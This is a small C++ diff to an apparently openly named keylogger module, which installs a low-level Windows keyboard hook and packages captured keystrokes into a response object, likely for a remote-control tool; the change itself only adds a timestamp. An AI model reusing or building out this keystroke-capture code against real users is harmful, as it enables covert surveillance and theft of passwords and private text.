@@ -1,4 +1,5 @@
 #include "KLG_Func.h"
+#include "utils.h"
 
 LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -22,7 +23,7 @@ LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 DataObj* KLG_Func::keylogger()
 {
     std::string res = "";
-    DataObj* MES = new KLG_Obj(DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res);
+    DataObj* MES = new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res);
 
 	// Thiết lập hook để bắt sự kiện phím
 	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
